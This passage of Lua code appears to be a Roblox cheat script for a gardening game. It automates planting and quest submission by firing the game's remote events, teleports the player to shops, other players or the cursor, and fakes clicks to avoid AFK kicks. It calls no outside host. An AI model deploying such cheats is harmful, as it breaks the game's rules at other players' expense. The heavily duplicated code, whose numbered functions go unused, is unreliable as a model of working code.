		part13 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part13.Size = Vector3.new(0.8, 1.65, 0.8)
		part13.Anchored = true
		part13.CanCollide = false
		part13.Position = Vector3.new(0, 5, 0)
		part13.Transparency = 0.5
		part13.Parent = workspace
	end

	if not value and part13 then
		part13:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part13.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part13.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part13.Position
			part13.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Cactus Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Cactus", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part14
local function startseedplacing14(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part14 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part14.Size = Vector3.new(0.8, 1.65, 0.8)
		part14.Anchored = true
		part14.CanCollide = false
		part14.Position = Vector3.new(0, 5, 0)
		part14.Transparency = 0.5
		part14.Parent = workspace
	end

	if not value and part14 then
		part14:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part14.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part14.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part14.Position
			part14.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Dragon Fruit Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Dragon Fruit", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part15
local function startseedplacing15(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part15 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part15.Size = Vector3.new(0.8, 1.65, 0.8)
		part15.Anchored = true
		part15.CanCollide = false
		part15.Position = Vector3.new(0, 5, 0)
		part15.Transparency = 0.5
		part15.Parent = workspace
	end

	if not value and part15 then
		part15:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part15.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part15.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part15.Position
			part15.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Mango Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Mango", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part16
local function startseedplacing16(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part16 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part16.Size = Vector3.new(0.8, 1.65, 0.8)
		part16.Anchored = true
		part16.CanCollide = false
		part16.Position = Vector3.new(0, 5, 0)
		part16.Transparency = 0.5
		part16.Parent = workspace
	end

	if not value and part16 then
		part16:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part16.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part16.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part16.Position
			part16.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Grape Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Grape", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part17
local function startseedplacing17(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part17 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part17.Size = Vector3.new(0.8, 1.65, 0.8)
		part17.Anchored = true
		part17.CanCollide = false
		part17.Position = Vector3.new(0, 5, 0)
		part17.Transparency = 0.5
		part17.Parent = workspace
	end

	if not value and part17 then
		part17:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part17.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part17.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part17.Position
			part17.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Mushroom Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Mushroom", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part18
local function startseedplacing18(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part18 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part18.Size = Vector3.new(0.8, 1.65, 0.8)
		part18.Anchored = true
		part18.CanCollide = false
		part18.Position = Vector3.new(0, 5, 0)
		part18.Transparency = 0.5
		part18.Parent = workspace
	end

	if not value and part18 then
		part18:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part18.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part18.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part18.Position
			part18.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Pepper Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Pepper", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part19
local function startseedplacing19(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part19 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part19.Size = Vector3.new(0.8, 1.65, 0.8)
		part19.Anchored = true
		part19.CanCollide = false
		part19.Position = Vector3.new(0, 5, 0)
		part19.Transparency = 0.5
		part19.Parent = workspace
	end

	if not value and part19 then
		part19:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part19.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part19.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part19.Position
			part19.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Cacao Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Cacao", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

-- part20
local function startseedplacing20(seedname, value)
	local locked = false 
	local car = mouse.Button1Down:Connect(function()
		if not locked then
			locked = true
			car:Disconnect()
		end
	end)

	if value then
		part20 = game:GetService("ReplicatedStorage").Seed_Models:FindFirstChild(seedname):Clone()
		part20.Size = Vector3.new(0.8, 1.65, 0.8)
		part20.Anchored = true
		part20.CanCollide = false
		part20.Position = Vector3.new(0, 5, 0)
		part20.Transparency = 0.5
		part20.Parent = workspace
	end

	if not value and part20 then
		part20:Destroy()
	end

	local rotation = 0
	while value do
		task.wait()
		HoldItem(seedname)
		local pos = part20.Position
		rotation = rotation + math.rad(1)
		if rotation > math.pi * 2 then rotation = 0 end

		if not locked then
			mousePos = mouse.Hit.Position
			part20.CFrame = CFrame.new(mousePos + Vector3.new(0, 4, 0)) * CFrame.Angles(0, rotation, 0)
		else
			currentPos = part20.Position
			part20.CFrame = CFrame.new(currentPos) * CFrame.Angles(0, rotation, 0)
			game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Plant_RE"):FireServer(pos, seedname)
		end
	end
end

APTab:CreateToggle({
    Name = "Auto Plant Beanstalk Seed",
    CurrentValue = false,
    Flag = "AutoPlantCarrot",
    Callback = function(Value)
        AutoPlantEnabled = Value


        if Value then
            PlantingThread = task.spawn(function()
                    startseedplacing("Beanstalk", true)

            end)
        else
            AutoPlantEnabled = false
            if PlantingThread then
                startseedplacing("", false)
                task.cancel(PlantingThread)
            end
        end
    end
})

local AQTab = Window:CreateTab("Auto Quest", 4483362458)


AQTab:CreateButton({
    Name = "Submit Held Plant",
    Callback = function()
        local success, err = pcall(function()
            game:GetService("ReplicatedStorage").GameEvents.NightQuestRemoteEvent:FireServer("SubmitHeldPlant")
        end)

        if success then
            print("Submitted held plant!")
        else
            warn("Submission failed:", err)
        end
    end,
})

local autoSubmitEnabled = false
local submitTask
local canSubmit = true

AQTab:CreateToggle({
    Name = "Auto Submit All Plants",
    CurrentValue = false,
    Flag = "AutoSubmitPlants",
    Callback = function(value)
        autoSubmitEnabled = value

        if value then
            submitTask = task.spawn(function()
                while autoSubmitEnabled do
                    if canSubmit then
                        canSubmit = false
                        pcall(function()
                            game:GetService("ReplicatedStorage").GameEvents.NightQuestRemoteEvent:FireServer("SubmitAllPlants")
                        end)
                        task.wait(1)
                        canSubmit = true
                    else
                        task.wait(0.1)
                    end
                end
            end)
        else
            if submitTask then
                task.cancel(submitTask)
                submitTask = nil
            end
        end
    end,
})

-- YayYay Woobeeeee 

local TPTab = Window:CreateTab("Teleports", 4483362458)

TPTab:CreateButton({
    Name = "Teleport to Event Circle",
    Callback = function()
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local hrp = character:WaitForChild("HumanoidRootPart")

        -- Teleport to specific coordinates
        hrp.CFrame = CFrame.new(-100.13, 4.28, -9.10)
    end,
})

-- Teleport to Egg Shop
TPTab:CreateButton({
    Name = "Teleport to Egg Shop",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-257.42, 3.00, -3.94))
        end
    end,
})


TPTab:CreateButton({
    Name = "Teleport to Gear Shop",
    Callback = function()
        local player = game.Players.LocalPlayer
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-262.87, 3.00, -31.23))
        end
    end,
})



 Players = game:GetService("Players")
 LocalPlayer = Players.LocalPlayer


 function GetPlayerList()
    local list = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(list, player.Name)
        end
    end
    return list
end


 selectedPlayer = nil
 teleportEnabled = false


 Players = game:GetService("Players")
 LocalPlayer = Players.LocalPlayer


local function GetPlayerList()
    local list = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(list, player.Name)
        end
    end
    return list
end


local selectedPlayer = nil
local teleportEnabled = false


local PlayerDropdown = TPTab:CreateDropdown({
    Name = "Teleport To Player",
    Options = GetPlayerList(),
    CurrentOption = nil,
    Callback = function(Option)
        
        if typeof(Option) == "table" then
            selectedPlayer = Option[1]
        else
            selectedPlayer = Option
        end
    end,
})


TPTab:CreateToggle({
    Name = "Enable Teleport",
    CurrentValue = false,
    Callback = function(Value)
        teleportEnabled = Value

        if teleportEnabled and selectedPlayer then
            local Target = Players:FindFirstChild(selectedPlayer)
            if Target and Target.Character and Target.Character:FindFirstChild("Head") then
                LocalPlayer.Character:MoveTo(Target.Character.Head.Position)
            end
        end
    end,
})


local function UpdateDropdown()
    PlayerDropdown:SetOptions(GetPlayerList())
end

Players.PlayerAdded:Connect(UpdateDropdown)
Players.PlayerRemoving:Connect(UpdateDropdown)

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

local isCtrlHeld = false

-- Detect when Ctrl is pressed or released
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if input.KeyCode == Enum.KeyCode.LeftControl then
		isCtrlHeld = true
	end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
	if input.KeyCode == Enum.KeyCode.LeftControl then
		isCtrlHeld = false
	end
end)

-- Teleport on Ctrl + Left Click
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end

	if input.UserInputType == Enum.UserInputType.MouseButton1 and isCtrlHeld then
		local character = LocalPlayer.Character
		if character and character:FindFirstChild("HumanoidRootPart") then
			local targetPosition = Mouse.Hit.Position
			targetPosition = Vector3.new(targetPosition.X, targetPosition.Y + 3, targetPosition.Z)
			character:MoveTo(targetPosition)
		end
	end
end)

local MyLabel = TPTab:CreateLabel("Hold Ctrl + Click TP")

local CredTab = Window:CreateTab("WebHook", 4483362458)

local SetTab = Window:CreateTab("Settings", 4483362458)


local VirtualUser = game:GetService("VirtualUser")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local isAntiAFKEnabled = false


local function startAntiAFK()
    coroutine.wrap(function()
        while isAntiAFKEnabled do
            -- Wait 18 minutes (1080 seconds)
            for i = 1, 1080 do
                if not isAntiAFKEnabled then return end
                task.wait(1)
            end

            -- Simulate click (or any small input)
            VirtualUser:Button1Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
            task.wait(0.1)
            VirtualUser:Button1Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
        end
    end)()
end

SetTab:CreateToggle({
    Name = "Anti-AFK",
    CurrentValue = true,
    Flag = "AntiAFKToggle",
    Callback = function(Value)
        isAntiAFKEnabled = Value
        if Value then
            startAntiAFK()
        end
    end,
})


local CredTab = Window:CreateTab("Credits", 4483362458)

local MyLabel = CredTab:CreateLabel("Script Owners - WooBeee#0655, CatCat6869")



applyautofarm()